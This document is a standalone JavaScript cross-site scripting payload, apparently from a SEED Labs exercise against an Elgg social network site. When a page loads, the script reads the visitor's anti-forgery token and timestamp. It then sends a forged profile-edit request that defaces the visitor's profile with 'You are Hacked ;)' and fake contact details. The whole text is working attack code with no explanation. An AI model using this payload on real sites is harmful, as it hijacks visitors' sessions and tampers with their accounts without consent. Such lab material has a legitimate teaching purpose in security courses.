<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	

	//Construct the content of your url.
    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN 
    var content = token+ts+"&name=name&description=1905022&accesslevel[description]=1&briefdescription=You are Hacked ;)&accesslevel[briefdescription]=1&location=bolbo+na&accesslevel[location]=1&interests=You are Hacked ;)&accesslevel[interests]=1&skills=You are Hacked ;)&accesslevel[skills]=1&contactemail=hackMail@hack.com&accesslevel[contactemail]=1&phone=0236&accesslevel[phone]=1&mobile=122&accesslevel[mobile]=1&website=http://www.hackerbd.com&accesslevel[website]=1&twitter=You are Hacked ;)&accesslevel[twitter]=1&guid="+elgg.session.user.guid;
	if(elgg.session.user.guid!=elgg.page_owner.guid)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
    }
}
</script>
